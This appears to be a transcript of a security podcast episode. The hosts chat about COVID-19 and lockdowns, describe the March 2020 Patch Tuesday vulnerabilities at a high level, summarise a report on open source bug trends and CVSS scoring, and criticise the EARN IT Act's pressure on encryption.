STEVE:  Well, no, I mean, he also knows me long enough to know that I know my body, and I know what's going on.  But the point is, and I don't really understand the logic of this, there are so few tests that they're rationing them.  But I'm as valid a test subject because what they would always do is, as I said to you, what they're doing is they're giving all the tests for all the other things that cause seasonal stuff.  And only if you're negative for all of them, that is, if they show that it's not any of the things we know about, then you get the special unavailable COVID-19 test.  So I'd love to take all of those other things.  Anyway, he just said, "I'm busy, go away."



And also I was already thinking, because normally I go in for my annual physical on my birthday.  And I was thinking, I'm not sure I want to go into a doctor's office during a period of a global pandemic because there are going to be sick people there.  Of course, that was before I became symptomatic.  So I'm not sure how I feel right now.  I think I'll wait until the summer, or at least till we get - see, the other thing is we don't yet - we haven't seen what China has seen.  As a consequence purely of the draconian measures they implemented, they've seen, they've hit a peak, and they've reversed it.



We've seen so far no reversal.  And you don't know anything about the future until you see a reversal.  That's the indication.  And of course you don't really know anything until you get tests.  And it's looking like we're going to end up probably having many, many, many more sick people than we expect.



LEO:  Yeah, that's obvious.



STEVE:  Because we just don't know how many people...



LEO:  We just don't know, yeah.



STEVE:  ...are still "pre."



LEO:  Yeah.  I'm assuming everybody I come into contact with is sick.  So I'm trying not to come in contact with them.  But we, you know, and we should mention that we have instituted policies here.  We're in one of the lockdown counties, or will be.  Seven of the Bay Area counties are locked down.  Sonoma County, our county is about to - oh, Steve, geez.  You poor guy.  Sonoma's about to join that.  You're in Orange County, not locked down.



But I think that this lockdown will go nationwide at some point, which means even though we're considered essential, media companies are essential, radio is essential and media companies, most of our employees are home right now.  Carson's home right now.  We have a skeleton crew that comes in, and we need an engineer here to set up the board.  But they're in another room.  I'm in my office.  I'm doing the whole day and will continue to do all the shows from my office, which only I enter.  Not even the cleaners come in here.  I've locked it.  And so if it's got germs, it's only my germs.  It's only Leo germs.  And then of course I'm staying inside at home.



STEVE:  Which your body already knows all about.



LEO:  It knows.  It's got the antibodies.  And then Lisa and Michael and I are staying at home, and nobody's coming over.  Actually this morning my trainer FaceTimed me.  We have a little home gym, so I was able to work out at home because they closed the gym.  But I was able to work out at home with my trainer on FaceTime.  You know, I didn't see her, but she could see me.  And that worked great.  So we're doing everything we can to keep our family, our TWiT family safe, and I hope you are, too, wherever you are.  And Steve, you're scaring me.  We've got to get to 999, that's all I'm saying.



STEVE:  Well, I hope there's an antibody test before we run out of digits here.



LEO:  Well, I'd be curious to know.  It sure sounds like - the only data point is that you didn't get a fever at all; right?



STEVE:  Yes, although there are asymptomatic, there are completely asymptomatic carriers of the virus.  We know that.



LEO:  That's what's so weird about this; right?



STEVE:  We know that for sure now.



LEO:  But you weren't asymptomatic.  You just got a different set of symptoms.



STEVE:  Well, no.  And so the point is there's a range from asymptomatic to oh, my god, get ye to the hospital.  And, you know, I mean, I've been symptomatic of something.



LEO:  That's clear.



STEVE:  And so tonsils...



LEO:  But the fact that you didn't have a temperature, maybe you got something else.  Maybe it was just a bad cold.  I've been taking...



STEVE:  We'll know someday.



LEO:  ...our temperatures.  We have an instant-read thermometer.  I've been taking Lisa, Michael, and my temperature every day.



STEVE:  Boy, and have you seen those are now $400 on Amazon?



LEO:  I'm trying to find them because I want to get one for my daughter.  She's not feeling well.



STEVE:  Yeah, no.



LEO:  Yeah, because - but the good thing is it's one of the in-ear ones and goes beep-beep.



STEVE:  Yup, I have one of those.



LEO:  And I take our temperature every day, hoping.



STEVE:  I have one, too.  I got it due to those E. coli experiences from Souplantation before I wised up and said, okay, no more tainted salad, thank you.



LEO:  Oh, my god.  COVID is not the topic of the show.  We talk about security.  But really COVID is part of the security scene; right?  I mean, it's not - I mean, for instance, the HHS got - hackers tried to break into it.



STEVE:  Oh, my god, I know.  Several attacks on different health-related organizations in the last week, just because they've got to aim their bots at somebody, so let's get into the news by attacking a group that are trying to help the planet.  So I just wanted to say...



LEO:  Go ahead.



STEVE:  I just want to say that the sequestration is the key.  If we could instantly separate everybody, this thing would burn out in 14 to 21 days.  That is, immediately it would be over.  And we're expecting to have more.  It's interesting, too, that we sort of have to be convinced of this because it's enough of an inconvenience for most people.  I have about a five-minute drive from where Lorrie and I are to where I go to work in my original Fortress of Solitude here every day.  Yesterday morning, whoa.  And I'm commuting, such as it is, my five-mile...



LEO:  There's nobody out there, is there.



STEVE:  No.  The traffic just disappeared.  It was, you know, it did not look like 8:00 a.m. on a Monday the way it normally looks.  So I guess this is enough of an inconvenience that people need to be convinced from the evidence that this is necessary.  But the problem is, due to this time delay and the nature of exponential growth, by the time you get convincing evidence, you're already way past a point that you could have been.  So as what's his name...



LEO:  Fauci.  Dr. Fauci, yeah.



STEVE:  Fauci said, he said:  "I'd far rather be accused of having overreacted than underreact and see the results of not having done so."



LEO:  The analog of this is the Y2K bug, which everybody said, well, see, nothing happened, nothing wrong, nothing went wrong.  Yeah, only because everybody worked their buns off...



STEVE:  Yes.  Yes.



LEO:  ...to make sure nothing went wrong.



STEVE:  Yes.  That's a perfect example.  The general public didn't see all the engineers checking for this months beforehand.



LEO:  So let's hope.  Let's hope that we are the guys coming in off the golf course to rewrite our COBOL programs.  And if we do it right, everybody'll say, see, there was no problem.



STEVE:  Or the Chinese restaurant program that I was involved with, Leo, because it was only there that it went from 1999 to 19100.



LEO:  This is probably a story you've told.  I don't remember it.  The Chinese restaurant project?



STEVE:  Yeah.  There was a place, the Mandarin Gourmet.



LEO:  19100.



STEVE:  Isn't that perfect?



LEO:  That's not the bug we were hoping for, or we were looking for.  Actually, everything would probably work if it went to 19100.  It was 2000 that confused people.



STEVE:  Yeah, they were just unhappy that the receipts said 19100.  And so they knew I was sort of a computer guy.



LEO:  Steve, Steve.  Free soup.  Just fix this.



STEVE:  It was the best hot-and-sour soup and Szechuan string beans anywhere.  So they said, "Can you do anything about this?"  And I said, "Well, we need to concern ourselves about when Leap Year happens because you'd like to have February 29 happen at the same time."



LEO:  Oh, man.  He's good.  Yeah.



STEVE:  I said, but if we were to just move the date back to a similar, to a synchronized calendar, then you wouldn't have a five-digit date any longer.  It wouldn't be the right date.



LEO:  Wouldn't be the right year, but it'd be the right day.



STEVE:  And he's like, "Oh, perfect."  I said, "No, but I could really do more."  And he said, "No, no, no.  That's fine."



LEO:  That's good enough.



STEVE:  "That's fine.  That's brilliant.  Thank you."  And I said, "Oh, okay."  But then, a few months later...



LEO:  That explains why on your receipt it says February 29th, 1904.  If you were wondering why, now you know.  Oh, my god.



STEVE:  That's right.  And then it was a few months later they had a bigger problem.  Gerald came to me, and he said, "Orange County's changing our tax rate."  And I said, "Oh."  And he said, "So now we're in real trouble," he said, "because all of the amounts are going to be wrong on all of our checks."  And I sighed, and I said,  "Okay.  Let me take a look at this."



LEO:  Let me fix this.



STEVE:  So I copied the software onto a zip drive.



LEO:  Oh, my god.



STEVE:  And brought it home.



LEO:  You had to disassemble it; right?  It was...



STEVE:  I did.  I had to hack it.  I went in.  What I did was I knew what the current tax rate was.  And so I converted that into floating point to see what the floating point representation was of the current tax rate.  Then I searched the code for that string of bites which would represent the current tax rate.  And I found it.  There was exactly one hit on it.  And so then I computed the floating point representation for the new tax rate and just patched it in.  I held my breath, crossed my fingers, and it worked.



LEO:  Amazing.



STEVE:  So I was able to just do a binary hack of their existing software.  Didn't have to reverse assemble it or do anything.  I just went in and went "gink" and fixed the tax code where it was in floating point representation.



LEO:  Back in the day, that's how we would take copy protection out of disks.



STEVE:  That's the way we solved these problems.



LEO:  Hex editor, little bit of editing, make sure it's not bigger than the original, and you're good.  Just change the jump.



STEVE:  So this week we're actually going to talk about other things.  We take a deep dive into the many repercussions preceding and following last week's Patch Tuesday.  And, oh, my god, Leo, this is a drama.  Wouldn't it be nice to...



LEO:  I am never, I mean, I have taken Windows off of everything.  That is, it's just unacceptable.



STEVE:  I know.  Wouldn't it be nice to have a quiet Patch Tuesday for a change.



LEO:  Every month.  Every month.



STEVE:  Every month.  But also we're going to look at a nice listing of free services being maintained by BleepingComputer's Lawrence Abrams.  We're going to look at a recent report into the state of open source software vulnerabilities, what's going on over there.  And, oh, Leo, at a new and truly despicable - and I have never used that word before, just never occurred to me, but wait till you hear about this - despicable legislation aimed at forcing social media companies to provide lawful access to their customers' encrypted content.  And of course we have a fabulous Picture of the Week.



LEO:  I love that.  And I agree with it.



STEVE:  Yes, our Picture of the Week.  My best buddy iMessaged this to me, and I grabbed it and thought it was perfect.  So we have the headline:  "Coronavirus Lockdown Rules:  Do not travel.  Do not socialize.  Remain inside."  And then the effect of those rules on two groups of people.  Normal people in the first frame, looks like somebody who's just had his beloved break up with him or something, and he's very distraught, like over the top.  And then the second group, gamers.  Yeah.



LEO:  Yeah, baby.



STEVE:  This is like, okay.  Do not travel?  No problem.  Do not socialize?  That's how I role.  And remain inside?  Where would I go?  So, yeah.  And does this look like Tom Cruise to you?



LEO:  It is Tom Cruise.  That's the crazy Tom Cruise.  I think it's when he was on "Oprah," and he was talking about his new relationship.



STEVE:  Oh, when he jumped around on the couch.



LEO:  Jumped around on the chairs, yeah.  I think that that's from that moment.



STEVE:  Was that Oprah, or was that Ellen whose chair he jumped off of?



LEO:  It actually looks like Ellen, but I think it was Oprah.  But anyway, does it matter, Steve?  I'm surprised you even know who Ellen and Oprah are.



STEVE:  I am, too, Leo, frankly.  You are the pop king, and I'm - what's pop?



LEO:  I might be a little bit ahead of you, but not much.  You know, this isn't just gamers.  All of us, that's the funny thing, all of us are going, yeah, great, I'll have more time to code.  Okay.  I can finally read that book.  



STEVE:  Well, and as we know, for me, my life is already like that.



LEO:  It's no different. 



STEVE:  Exactly.  Except I'm no longer getting my coffee from Starbucks in the morning because thank you anyway.  I'm back to making it myself.



LEO:  Would you like some COVID-19 with that, sir?  A shot of COVID-19?



STEVE:  Yeah, well, think about it.  If somebody, if a barista did not have clean hands, they're snapping that plastic lid on every single paper cup that goes out.  And then you're putting your mouth on it.



LEO:  Yeah, exactly.  It's been an opportunity for Lisa and I to do more cooking.  We don't go out to eat.  We cook.  I cooked up a big batch of spaghetti sauce and vegetarian black bean chili last night.  I just, I mean, it's fun.  Actually, I'm having a great time.  I took my sourdough out of the starter.  I'm going to make some bread.  It's good.  It's good times.



STEVE:  It's the sad times at the Houlihan's Bar, however.



LEO:  Yeah.  On St. Patrick's Day, too.



STEVE:  St. Patrick's Day, nothing's happening.  Okay.  So Patch Tuesday redux.  We're actually going to do this in two parts.  I forgot to mention that the title of Episode 758 is the SMBGhost Fiasco, which is one of the things that arose from Microsoft's - the interesting nature of their rollout and pullback and then delivery of a patch for an important vulnerability.  So looking first at just Patch Tuesday, every single Patch Tuesday so far - well, okay, there have only been three of them this year, but still - it's resulted in, as we know, in a flurry of after-effect scrambling of one sort or another.



Last week's Patch Tuesday did not break the pattern.  And it seems that increasingly, as Microsoft works to fix one problem, another one springs up.  And as I was thinking about this yesterday, I was immediately put in mind of one of the most famous Three Stooges episodes titled "A Plumbing We Will Go."  Which I have a link to a snippet from it.  It's a minute and 40 seconds from a 17-minute episode.  But Curly...



LEO:  Curly has a pipe.  It gets worse.



STEVE:  Oh, god.  It's just so brilliant.  Curly, of course, has very short hair.  He attempts to solve the problem of the shower leaking by screwing a pipe into it.  And then he's all happy until he turns around and realizes that there's a T-junction on the end of the pipe, and now there's two fountains of water coming out.  So of course the point is that, rather than thinking that maybe he needs to rethink his strategy, he thinks like Microsoft that the strategy is good, I just need more of the same.  So of course he continues adding pipes to this contraption until he ends up, we'll see here toward the end, he's basically jailed himself in a containment.  It really is a funny episode.  It's no longer politically correct, but it is quite funny.



LEO:  None of these are - yeah, he's - oh.



STEVE:  And here he is.



LEO:  Oh, there he is.  Oh.  That's Microsoft in a nutshell, right there.  That's Windows, right there.  That's exactly what the code of Windows looks like.



STEVE:  This is the analogy for Windows Patch Tuesday is you just keep adding pipes to the leaks, and it solves the leak where it was; but, oops, it springs out at the end of the pipe.  So we have a whopping 117 vulnerabilities.



LEO:  Oh, geez.



STEVE:  I didn't count them myself, and I saw 115, 116, 117.  So you get the sense of scale, depending upon who you ask.  But in any event, 25 of them are rated critical.  All of them, all of the critical ones enable remote code execution and in some cases privilege elevation.  In addition, that 25 are fleshed out by 91 rated as important, and then a single one at moderate.  The top 20 of the 25 critical vulnerabilities are the most interesting.  And believe it or not, Leo, I can't believe that it's 2020.  Windows is still having problems with .LNK files, with dot L-N-K files.



LEO:  Oh, my god.



STEVE:  Remember Windows 95, anyone?  Unbelievable.  We have CVE-2020...



LEO:  I swear to god, this is why I've switched to Linux.  I just - it doesn't happen.  It doesn't happen.



STEVE:  CVE-2020-0884 describes, get this, a remote code execution vulnerability in Windows, occurring when a user opens a specially crafted and malicious .LNK file, which is just supposed to be a pointer to something else.  So this file could be, this .LNK file could be presented to the victim on a removable drive or a remote share, and when opened would execute a malicious binary embedded in the .LNK file.  So it's a sort of self-contained buffer overflow in a Windows .LNK file.  And what's significant about this is that since .LNK files are non-executable, they are often passed over by any channel-monitoring AV system in the interest of it saving time.



These AB systems are desperate not to slow things down because they're already criticized for the fact that they do in fact impede the flow because they've got to open everything up and see if anything looks bad.  So when they see a .LNK file, like, ah, that's just a .LNK file, we're fine, and lets it by.  Except now.  So that allows them to bypass AV system protections, which makes this worse.  So one of the 25 was a remote code execution provided in a Windows .LNK file.



Then we had four memory corruption vulnerabilities in Microsoft's Media Foundation.  Any four of those could allow an attacker to gain the ability to install programs; view, change, or delete data; or create new user accounts on the victim's machine.  None of that's good.  And worse, a user might have run afoul of this merely by accessing a malicious file or a web page, so it's easy to encounter.  Attackers are most likely to try and exploit this vulnerability via spam email with malicious links and attachments.  And I didn't dig any further in.  But it sounds like we have four still surviving buffer overflows somewhere in the media content interpretation.  We've often seen how difficult it is to get everything right in interpreters.  But Microsoft still hasn't managed to.



And you know, Leo, doesn't it feel like with Curly and bathtub, we're not making progress on this problem?  I mean, it's just like, when is this going to end?  117 things to patch now?  Anyway, next up, and I had to count them,  I counted 10.  So half of the top 20 of the important vulnerabilities were all found in the way Microsoft's ChakraCore scripting engine, which of course is the engine Microsoft wrote from scratch for the first attempt at its illustrious brand new Edge web browser,  which of course it later abandoned, and Edge of course replaced the creaky old Internet Explorer.  In every one of these 10 different instances, an attacker could successfully corrupt - I've been suppressing a cough for a while - could corrupt the victim machine's memory in a way that would allow them to execute arbitrary code in the context of the current user.



Given that our web browsers are now the way we reach out onto the Internet and expose ourselves, I'm sure everyone is happy with Microsoft's decision to simply put their own window dressing around the open source, community developed and maintained Chromium web browser.  But until you switch to that, 10 problems have been found, serious remote code execution problems in the original ChakraCore engine for Edge.



Then we had two additional critical remote code execution vulnerabilities fixed in the VBScript engine.  That's not the JScript.dll, which is the old one that earlier versions of IE used, but IE11 doesn't use, but still would get invoked.  This is JScript.dll, which is what IE11 now uses.  So an attacker could exploit those two bugs by tricking the user into visiting a specially crafted website in IE11, or by marking an ActiveX control "safe for initialization" in an application or Microsoft Office document that hosts the IE11 rendering engine, as many of them do.



So these bugs, fortunately, well, there's only two of them, specifically require some user interaction and would rely on some form of social engineering on the attacker's part.  Although they're both rated critical, and they're remote code execution, you have to, like, first go there and then load a document and then get it executed.  So it requires more jumping through hoops, but that's not that high a bar these days.



So we wrap up the top 20 with two final ones, 2020-0881 and 0883, also remote code execution vulnerabilities, this time in GDI+.  They're trickier because it's much more necessary for an attacker to get the user to jump through some hoops.  But given that that could be done, they were rated critical, and Microsoft has patched them now.  So I'm going to stop talking about last Tuesday because something way more bizarre that had the whole industry scratching its head happened last week, which I decided needed its own treatment, and it's the title of the podcast, the SMBGhost Fiasco, where I don't hold Microsoft to blame, at fault.  I mean, it's bad that they had the problem.  But it's a weird set of coincidences that caused them to really create a mess.  So we will wrap up by talking about that.



I did want to note that last week we mentioned four companies - Microsoft, Google, Cisco, and LogMeIn - who are all making their various telecommuting resources available for, in the case of Google, Cisco, and LogMeIn 90 days; in the case of Microsoft 180 days, to help with, minimize the impact of lifestyle changes being driven by the need for isolation.  Of course that's more important today than it was a week ago.  So that's even more significant.  I stumbled upon this.  BleepingComputer's Lawrence Abrams is now created and has expanded upon this and is actively maintaining a page.  I've got a link to it in the show notes.  I imagine if you were to google "list of free software and services during coronavirus outbreak," that's in the tail of his URL, you would probably find it.



He wrote on that page:  "In response to the Coronavirus (COVID-19) outbreak, many organizations are asking their employees to work remotely.  This, though, brings new challenges to the workplace as users adapt to video meetings, screen sharing, and the use of remote collaboration tools.  To assist a new wave of remote works and get some publicity at the same time, many software developers and service providers have started to offer free licenses or enhanced versions of their software and services."  He says:  "Below is a roundup of the free upgrades to services and software licenses being offered during the coronavirus outbreak."



LEO:  This is very handy.  I've been looking for something like this.  This is really good, yeah.



STEVE:  Yeah.  And he said:  "If you are a software developer or technology service provider and would like to add any free offers to the list, please contact us and let us know."



So if I have helped to spread the word, I'm delightful.  I'm delighted.



LEO:  And delightful, yes.



STEVE:  Yeah, well, okay.  Hopefully.  When I'm not in everyone's ear.  So rather than go through - he provides a detailed list of all of the vendors...



LEO:  This is great.



STEVE:  ...with descriptions of what they are doing.  It would take two more...



LEO:  Most of these are time limited, usually for three months or thereabout, which is the presumptive time we'll be stuck inside.



STEVE:  Right.  It would take about two more podcasts to go through in detail what they're each doing.  So here are the vendors:  Adobe, AT&T, Avid - which I thought was interesting -  Cisco, Cloudflare, Discord, Drastic Technologies Ltd., Google, Instant Housecall, LinkedIn, LogMeIn, Loom, Microsoft, OneClick, Splashtop, TechSmith, Zoho, and Zoom.  So if you know any of those companies, you like their stuff, you might check with BleepingComputer's list to see what is being offered and whether that's of use to you.



LEO:  A number of people tried Teams because Microsoft has offered that for free.  And it crashed, so many people tried it.  It was down.



STEVE:  Well, yeah, that's the other really interesting thing.  Our buddy at Cloudflare posted a blog about the observed change in traffic that they are seeing as a consequence of more people beginning to move to home work.  



LEO:  A lot of people are home.  Get ready, because it's going to be a landslide over the next seven days.



STEVE:  Yeah, it is.  Oh, and there was one other item.  I noted that Lawrence did not include Pornhub, Leo, on his list of special services being offered...



LEO:  Is it free now?



STEVE:  ...during this stay-at-home response to the global pandemic.



LEO:  You and I have girlfriends.  We don't really...



STEVE:  Yeah.



LEO:  But if you're all alone, you know.



STEVE:  Well, I got a surprise.  It was in the news.  So I went looking for the details in order to put it into the show notes.  And I figured I'd go to the horse's mouth.  A Google search returned the headline "Coronavirus-free Video for Quarantined Italians" at Pornhub.  What I was confronted with was definitely not the horse's mouth.



LEO:  Now I know why you're coughing.



STEVE:  Yeah, do not go there, by the way, anybody.  I've never gone; and, whoa, it takes no prisoners.



LEO:  No.  



STEVE:  Anyway, I found a banner:  "Pornhub is donating its March proceeds..."



LEO:  Oh, that's nice.



STEVE:  "...from Modelhub to support Italy during this unfortunate time.  Model earnings will remain untouched.  This is coming straight from Pornhub's share.  To help keep you company during these next weeks at home, Italy will also have free access to Pornhub Premium through the month."  So it's looking better, being stuck indoors if you're in Italy.  Yes, never a dull moment for our listeners.  That's interesting.  I wonder what'll happen with April 15th deadline.



LEO:  I think they already said you have 90 days to pay.



STEVE:  Think they're going to extend the filing deadline?



LEO:  Normally you can file and do an extension, but you still have to pay.  You can now do an extension, and you can defer payment, as well, I think, for up to 90 days.  That's what Lisa...



STEVE:  That's a nice bit of cash relief. 



LEO:  They have to do stuff like this.  Many states are making it so that you can't get evicted, that you can't get your power turned off.  I mean, there's a lot of people who are going home without a job, in so many cases without a severance check.  They're just on the streets, and this is tough for all of us.



STEVE:  Well, and I wish there were some way to say don't send me a thousand dollars because I'd much rather give it to, like have it spread around people who really need it.



LEO:  Good point.



STEVE:  I'm not impacted by this.  But there's no way to do that.  But I guess I could donate it to a charity or something.  But, yeah.



LEO:  Anyway.



STEVE:  So the state of open source vulnerabilities.  This was cool.  I had to be very careful in the reporting on this because this company WhiteSource looks like they're sort of competing with the systems in place for dealing with open source vulnerabilities.  So there was a little bit of a nanni-na kind of thing, which I had to filter out.  But at least they did the work of surveying 650 developers that nobody else did.



So they collected some data.  And it actually wasn't surprising, which in itself is interesting.  They collected data from 650 developers, from the national vulnerabilities database, from security advisories, peer-reviewed vulnerability databases, issue trackers, and other sources.  That allowed them to formulate a snapshot of the state of software vulnerabilities among open source projects.  I have a link to their page that makes you put in an email address in order to get the PDF.  It's like, okay, fine.  But I have it.



So Sophos was a little bit brutal in their summary of the report.  They wrote:  "Open source bugs have skyrocketed in the last year," they said, "according to a report from open source license management and security software vendor WhiteSource."  Thus the bit of a competitive challenge.  "The number of open source bugs sat steady at just over 4,000 in 2017 and 2018, the report said, having more than doubled the number of bugs from pre-2017."  In fact, we can see that in the chart below, where it was much lower.  Then there was a big jump at 2017 and 2018, which were about the same.  And then another nearly 50% increase last year.



So something's going on.  And the question is, what?  The CWE, that's the Common Weaknesses Enumeration system, which broadly classifies bug types, in the report states that by far the most common CWE encountered in the open source world is cross-site scripting problems.  So that's not a surprise.  That's been an ongoing problem.  That accounted for nearly a quarter of all bugs.  And it was the top for all languages except C.  Cross-site scripting was followed by improper input validation, then by buffer errors...



LEO:  Let me guess where the C was.



STEVE:  ...out-of-bound reads, and information disclosure.  You're probably right.  It's probably the buffer-handling things that C is, like, makes so easy to get wrong.



LEO:  There's no range checking, and it's easy to go outside the buffer accidentally, yeah.



STEVE:  Yeah.  Well, yeah, I mean, absolutely no checking whatsoever.  You get a pointer to RAM.



LEO:  Right, anywhere you want.



STEVE:  And you're supposed to not go below it.  I mean, and many C techniques, like to scan the buffer...



LEO:  Oh, yeah.



STEVE:  ...you increment the pointer.  



LEO:  Ninety percent of what you learn in C is pointers, and pointers to pointers, referencing and dereferencing, and tricks thereon.  That's mostly what people do.



STEVE:  Yeah, it's a lot of fun, and you can get yourself in a lot of trouble.



LEO:  We used to have, in the old BASIC days, PEEK and POKE.  It's kind of like that, you know, you can look anywhere in memory.  You can put anything anywhere you want.



STEVE:  Yeah.  Now it turns out that Pornhub has PEEK and POKE, Leo.



LEO:  PEEK and POKE as well, yes, it's another - yeah.



STEVE:  That's right.  So there's also...



LEO:  These numbers bother me because I think the difference is with open source it's open.  And so you have these CVEs and the CWEs.  And there's a lot of them.  They issued them, I feel like it's FUD against open source.  You just don't have as many in closed source because it's not open.



STEVE:  Correct.



LEO:  So people don't know about the bugs.



STEVE:  Yes.  Okay, shall we say Microsoft Windows?



LEO:  Yeah, yeah.



STEVE:  We're not lacking for bugs in Windows, yeah.



LEO:  And the other thing is of course they get fixed, and I think they get fixed right, not by Curly, most of the time.



STEVE:  Yeah, yeah.  So then there are use-after-free problems where your language allocated some dynamic memory to hold something.  You got a handle to it, which is often a pointer.  And then the system garbage-collected it, or you released the memory, returning it to the system, but you still have the handle.  So if the language you're using doesn't invalidate the handle to prevent its use, you're able to access memory that could be - or rather an attacker - access memory that could be pointing to anything at that point.  So that distribution of the bugs is no surprise.  That's the common bell curve of distribution.  So there's been no explosion over the years in any one particular class of bug.



What we want to know is whether the increased numbers arise from there actually being more bugs per line of code, that is, the reduced quality of code?  Or is it increased scrutiny of the same quality code which, as we know, will reveal more previously undiscovered bugs?  Or is it that there's been a rise in the quantity of similar quality code, thus naturally resulting in a higher bug count?  And we know that the open source community is way more active now than it was four years ago.



LEO:  And to be fair, it's all three because anybody can contribute to an open source project.  So it's not like there's any, you know, you have to pass a test to become an open source contributor.  But I think the open source projects generally do very well.  I don't know.  I feel better running open source.  And I have to say, when I'm using Linux, I'm just going, "Thank god I'm not using Windows."



STEVE:  Well, you know, I mean, and it's extremely handy.  I needed for SpinRite - and by the way, the little video clip you played in MacBreak Weekly about, I don't know what it was.



LEO:  Oh, yeah.



STEVE:  What's on the agenda for Tuesday?  Well, MacBreak Weekly and endless discussions of SpinRite.



LEO:  That hasn't been true.  You haven't even mentioned SpinRite in a long time.



STEVE:  Not been true for a long time, in my defense.  But also historically, once upon a time...



LEO:  Back in the old days, yeah.



STEVE:  Well, and I have to say that it apparently was useful because in the selfie lines, many of our listeners are coming up to me with CDs to sign.  They want autographs of their SpinRite memorabilia. 



LEO:  I got no problem with you plugging SpinRite.  That's something everybody needs to know about.



STEVE:  And at this point our listeners would desperately love to have me plug SpinRite, that is, to have SpinRite to plug.  So we're heading there.



LEO:  He's working on it.  He had to take a little time off, but he'll get better.



STEVE:  So their report states:  "Given the continued increase of both open source usage and security research, the number of reported open source vulnerabilities will surely keep rising.  In addition, we're starting to see the open source community looking for new initiatives in order to address the chaos in the open source security process."



LEO:  And there's a little bit of that, too.  That is fair.



STEVE:  Yeah.  And they said:  "One good example is the GitHub Security Lab, which aims to help researchers, open source project maintainers, and users to easily report suspected vulnerabilities in a secure manner without exposing a zero-day vulnerability to the world."  And that's really a good point, that - excuse me.



LEO:  Steve, you're making me feel bad.



STEVE:  I am so exhausted, Leo.



LEO:  I bet you are.



STEVE:  But I'm going to get through this.



LEO:  We'll wrap this soon, and you can go back to bed.



STEVE:  I never really focused on that before.  It's easy to keep a critical zero-day secret in proprietary closed source software.



LEO:  Exactly, exactly.



STEVE:  Since its discoverer only needs to privately contact the software's publisher.  But in an inherently open world, where all regular business is conducted publicly and in full view of the world, we need some mechanism to be able to operate behind the scenes.  So it's very cool that we have the GitHub Security Lab to step in with that role.



LEO:  Yeah.  And I think the telling statistic is that 85% of open source security vulnerabilities have already been fixed before disclosure.  That's the good news.  That's what you really want.



STEVE:  Yes.



LEO:  That means only 15% are zero days or, you know.  I mean, that's a big difference.



STEVE:  Did I skip that, or did you see that?



LEO:  I saw it.  I don't know if you said it.



STEVE:  Yeah, I think maybe I skipped it.  But that was - oh, yeah.  Oh, yeah.  Under the category - I did skip it.  Under the category of "good news," the report notes that over 85% of open source security vulnerabilities are fixed, are disclosed with a fix already available. 



LEO:  Yeah, [crosstalk].



STEVE:  And they said tech giants, yes, tech giants have invested heavily in better securing and managing open source projects over the past few years.  And the community is working hard at security research to publish newly discovered open source security vulnerabilities along with a fix.  They said the fix will usually be an updated version or a patch for the vulnerable code.



Oh, and one thing that's a little bit of a twist, just to finish covering this comprehensively, there's a growing number of vulnerability reports facing an insufficiency of developer resources which are required to examine, evaluate, and repair them.  This suggests that we need a good triage system.  We need them to be assigned useful priorities so that the ones that are really critical are handled first, given that you can't do everything.  Turns out that some recent changes have made this a bit more tricky.  The report explains it.



They said:  "The rising number of reported vulnerabilities demands that development teams quickly prioritize their security alerts.  The CVSS (Common Vulnerability Scoring System) is usually the go-to parameter for remediation prioritization, but should it be?  CVSS was updated several times over the past few years (v2 to v3, and most recently v3.1), in the hopes of achieving a measurable, objective standard that helps support all organizations and industries.  However, it has also changed the definition of what a high-severity vulnerability is."



They said:  "We looked at over 10,000 vulnerabilities from 2016 through 2019 and checked their CVSS v2, v3, and v3.1 to compare the severity breakdown of vulnerabilities in each scoring version over the past four years  The most noticeable change we saw in the update from v2 to v3 is that scores rose substantially, since a vulnerability that would have been rated at 7.6 under CVSS v2 would quickly find itself with a 9.8 under CVSS v3."  And they said with CVSS v3 teams faced a higher number of, you know, running around with your hair on fire critical severity vulnerabilities.



So the sense we got was that we don't yet have the prioritization tools necessary.  That would be something to focus on, for the community to focus on, is let's get real about creating a useful distribution so that not everybody is given a 9.8.  If something doesn't absolutely really have to get fixed immediately, it could live down in the sixes and sevens, and it'll be dealt with, not never, but once the really hair-on-fire deals are handled.



So anyway, a useful, I thought, a useful snapshot of where we are.  No big change.  A big absolute jump in the numbers, but only because there's so much more open source software activity today than there was four years ago.  And I agree with you, Leo.  Oh, I was going to mention that SpinRite - oh, it's what put me on the SpinRite topic that we branched off to is that I have a customized version of FreeDOS that I was able to create only thanks to the fact that it is open source.  The problem is that SpinRite 6.1 will be encountering many non-FAT drives.  And FreeDOS never expects to encounter a non-FAT drive.



LEO:  It's so old, yeah.



STEVE:  So it goes out and attempts to literally log onto them in succession at boot time.  And it runs across something it has - it's like, what?  In some cases it just explodes.



LEO:  Well, that's not good.



STEVE:  So I was able to go in.  I added a new config.sys option, skipinit, which will be turned on in SpinRite's case.  And it just says, don't worry about anything out there.  We've got that.  We'll be taking care of that here in the future.  Just you go, you know, finish booting and then give us control.



LEO:  Cool.



STEVE:  Okay, now, Leo.



LEO:  I know you're peeved.



STEVE:  I'm not sure if you should take your blood pressure before or after this one.



LEO:  Oh, I know all about this, and we've been talking about it for a while.



STEVE:  Oh, oh.



LEO:  And what's sad is they're sneaking this through during this COVID crisis because they know that nobody will pay any attention to it.  I even saw one of them, I think Dick Blumenthal, say...



STEVE:  I'm so disappointed.



LEO:  I am, too.  "We don't mention anything about encryption.  What are you talking about?"



STEVE:  We're not talking about encryption.



LEO:  Well, you'd better explain.



STEVE:  Okay.  So it surely does appear that our government, embodied by crypto-naive politicians, maybe willfully so, is one way or another going to figure out how to break into the encryption protection assets of American citizens.  The most recent effort, dubbed the "EARN IT" act is almost despicable.  Okay, first of all, EARN IT is the most tortured abbreviation we've encountered in some time.



LEO:  It's called a "retronym."  



STEVE:  Oh, my god.



LEO:  They come up with the name, and then they say what it stands for.  They figure it out.



STEVE:  Never has that been more obvious than now.  It stands for Eliminating Abusive and Rampant Neglect of Interactive Technologies.



LEO:  Oh, we've been neglecting them.



STEVE:  I think Lindsey was so proud of himself.  Okay.  So get a load of this.



LEO:  It's Lindsey Graham and Dick Blumenthal, the sponsors of this, yeah.



STEVE:  What is it that strong data encrypting companies would be earning?  The legislation proposes to strip the protection provided by Section 230 of the Communications Decency Act from certain apps and companies, which would then hold them responsible for user-uploaded content unless they provide a means for "lawful access" to their encryption-protected content.  In other words, they're holding ransom the hold harmless...



LEO:  Yeah, because these are unrelated issues.



STEVE:  Yes.  They're completely independent.  They are ransoming this necessary section, this Section 230 of the Communications Decency Act, which social media companies have to have.  And everything about this is slimy.  So in other words, the legal protections that currently serve, they're in place, to hold all of our online social media companies harmless for whatever their users post, would now need to be earned by allowing law enforcement to have decryption access.



